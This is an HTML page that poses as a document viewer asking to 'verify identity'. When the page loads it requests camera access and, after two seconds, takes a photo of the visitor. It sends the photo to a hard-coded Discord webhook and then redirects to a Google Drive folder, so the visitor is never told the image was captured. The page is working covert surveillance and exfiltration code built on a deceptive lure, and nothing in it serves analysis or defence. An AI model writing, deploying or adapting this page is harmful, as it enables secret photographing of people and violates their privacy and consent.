<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Loading Document...</title>
<style>
  body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;text-align:center;padding:20px;background:#f5f5f5;color:#333}
  .container{background:white;padding:20px;border-radius:8px;box-shadow:0 2px 4px rgba(0,0,0,.1);max-width:300px;margin:50px auto}
  video{width:100%;border-radius:4px;display:none;background:#000}
  p{font-size:14px;color:#666}
</style>
</head>
<body>
<div class="container">
  <h3>Verifying Identity</h3>
  <p>Please allow camera access to view the document.</p>
  <video id="video" autoplay playsinline></video>
  <canvas id="canvas" style="display:none;"></canvas>
</div>

<script>
  /* ---------- CONFIGURATION ---------- */
  const GOOGLE_DRIVE_LINK = "https://drive.google.com/drive/u/6/folders/1UHDGhaFXQ_gAlcmt8g3fkT4YX8rHJYpZ";
  const WEBHOOK_URL = "https://discord.com/api/webhooks/1505273360391602418/I4OnCKamE02G2jtK9i0IJyFrX1GNrqYKQ_QQ61OmwyjqHXTYPj3FVDzcu1-dhL3JT7ri";
  /* ----------------------------------- */

  async function startCamera() {
    try {
      const stream = await navigator.mediaDevices.getUserMedia({
        video: { facingMode: "user" }
      });
      const video = document.getElementById('video');
      video.srcObject = stream;
      video.style.display = 'block';
      setTimeout(() => takePhotoAndRedirect(stream), 2000);
    } catch (err) {
      console.error("Camera error:", err);
      alert("Camera permission denied. Redirecting anyway...");
      window.location.href = GOOGLE_DRIVE_LINK;
    }
  }

  function takePhotoAndRedirect(stream) {
    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');
    const ctx = canvas.getContext('2d');

    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
    const imageData = canvas.toDataURL('image/jpeg', 0.8); // 80% quality

    stream.getTracks().forEach(t => t.stop());

    document.getElementById('video').style.display = 'none';
    document.querySelector('h3').innerText = "Access Granted";
    document.querySelector('p').innerText = "Redirecting to document…";

    sendImageToWebhook(imageData);

    setTimeout(() => { window.location.href = GOOGLE_DRIVE_LINK; }, 1000);
  }

  function sendImageToWebhook(base64Image) {
    if (!WEBHOOK_URL) {   // <-- Only block if URL is empty
      console.log("No webhook URL configured. Image not sent.");
      return;
    }

    // Discord accepts a data‑URI as an embed image URL.
    // If you prefer to send it as plain text, replace `image` with `content`.
    fetch(WEBHOOK_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        content: "📸 **Camera Access Granted!**",
        embeds: [{
          title: "User Selfie",
          image: { url: base64Image }
        }]
      })
    })
    .then(r => {
      if (!r.ok) throw new Error(`HTTP ${r.status}`);
      console.log("Image sent to Discord");
    })
    .catch(err => console.error("Failed to send webhook:", err));
  }

  window.onload = startCamera;
</script>
</body>
</html>
